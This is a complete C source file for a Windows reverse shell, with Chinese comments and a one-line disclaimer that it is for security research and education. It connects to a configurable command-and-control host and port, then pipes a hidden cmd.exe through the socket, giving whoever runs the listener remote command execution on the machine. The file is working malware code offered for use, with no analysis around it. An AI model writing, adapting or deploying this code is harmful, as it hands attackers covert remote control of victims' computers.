/**
 * Basic Reverse Shell in C
 * 仅供安全研究和教育目的使用
 */

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "127.0.0.1"
#define C2_PORT 4444

int main(int argc, char *argv[])
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *host = C2_HOST;
    int port = C2_PORT;

    // 允许通过命令行参数指定C2地址
    if (argc >= 2) {
        host = argv[1];
    }
    if (argc >= 3) {
        port = atoi(argv[2]);
    }

    // 初始化 Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // 创建 socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 配置服务器地址
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    // 连接到 C2 服务器
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 配置 STARTUPINFO，将标准输入/输出/错误重定向到 socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 隐藏窗口
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    memset(&pi, 0, sizeof(pi));

    // 创建 cmd.exe 进程，使用 UTF-8 编码 (chcp 65001)
    if (!CreateProcess(
            NULL,           // 模块名
            "cmd.exe /k chcp 65001 >nul",  // 启动时切换到 UTF-8 编码
            NULL,           // 进程安全属性
            NULL,           // 线程安全属性
            TRUE,           // 继承句柄
            CREATE_NO_WINDOW, // 不创建窗口
            NULL,           // 使用父进程环境
            NULL,           // 使用父进程目录
            &si,            // STARTUPINFO
            &pi             // PROCESS_INFORMATION
        )) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 清理
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
